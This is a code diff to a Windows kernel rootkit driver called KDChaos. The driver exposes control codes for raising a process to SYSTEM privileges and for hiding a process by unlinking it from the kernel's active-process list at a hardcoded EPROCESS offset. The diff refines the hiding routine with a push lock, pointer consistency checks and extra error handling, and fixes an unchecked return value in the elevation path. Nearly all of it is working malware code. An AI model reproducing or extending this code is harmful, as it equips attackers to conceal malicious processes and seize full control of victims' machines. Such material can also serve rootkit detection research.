@@ -2,7 +2,7 @@
 #include <ntdef.h>
 #include <minwindef.h>
 #include <ntstrsafe.h>
-
+#include <wdm.h>
 
 #define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 
@@ -13,6 +13,8 @@ UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KDChaos");
 UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");
 
 char* PsGetProcessImageFileName(PEPROCESS Process);
+
+EX_PUSH_LOCK pLock;
 
 int
 PrivilegeElevationForProcess(
@@ -42,7 +44,7 @@ PrivilegeElevationForProcess(
             return (-1);
         }
 
-        PsLookupProcessByProcessId((HANDLE)0x4, &sys); // system handle
+        ret = PsLookupProcessByProcessId((HANDLE)0x4, &sys); // system handle
 
         if (ret != STATUS_SUCCESS)
         {
@@ -126,7 +128,7 @@ PrivilegeElevationForProcess(
     return (0);
 }
 
-int
+int 
 HideProcess(
     int pid
 )
@@ -138,32 +140,51 @@ HideProcess(
     __try
     {
 
-        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS*)&process);
+        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS *)&process);
 
         if (ret != STATUS_SUCCESS)
         {
             if (ret == STATUS_INVALID_PARAMETER)
             {
-                DbgPrint("the process ID was not found.");
+                DbgPrint("The process ID was not found.");
             }
             if (ret == STATUS_INVALID_CID)
             {
-                DbgPrint("the specified client ID is not valid.");
+                DbgPrint("The specified client ID is not valid.");
             }
             return (-1);
         }
 
-        plist = (PLIST_ENTRY)((char*)process + 0x448);
+        plist = (PLIST_ENTRY)((char *)process + 0x448);
+
+        ExAcquirePushLockExclusive(&pLock);
+
+        if (plist->Flink == NULL || plist->Blink == NULL)
+        {
+            ExReleasePushLockExclusive(&pLock);
+            __leave;
+        }
+
+        if (plist->Flink->Blink != plist || plist->Blink->Flink != plist)
+        {
+            ExReleasePushLockExclusive(&pLock);
+            DbgPrint("Error: Inconsistent Flink and Blink pointers.");
+            return (-1);
+        }
+
         plist->Flink->Blink = plist->Blink;
         plist->Blink->Flink = plist->Flink;
 
         plist->Flink = NULL;
         plist->Blink = NULL;
 
+        ExReleasePushLockExclusive(&pLock);
+
         DbgPrint("Process '%wZ' is now hidden", PsGetProcessImageFileName(process));
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
+        DbgPrint("An exception occurred while hiding the process.");
         return (-1);
     }
 
@@ -206,6 +227,7 @@ NTSTATUS processIoctlRequest(
 
     if (pstack->Parameters.DeviceIoControl.IoControlCode == PRIVILEGE_ELEVATION)
     {
+    
         RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
 
         pstatus = PrivilegeElevationForProcess(inputInt);
@@ -228,8 +250,8 @@ void IRP_MJCreate()
 }
 
 void IRP_MJClose()
-{
-    DbgPrint("IRP_CREATED\n");
+{ 
+    DbgPrint("IRP_CLOSED");
 
 }
 
@@ -240,7 +262,7 @@ DriverEntry(
 )
 {
     DbgPrint("Driver Loaded\n");
-
+    ExInitializePushLock(&pLock);
     UNREFERENCED_PARAMETER(registryPath);
     UNREFERENCED_PARAMETER(driverObject);
 
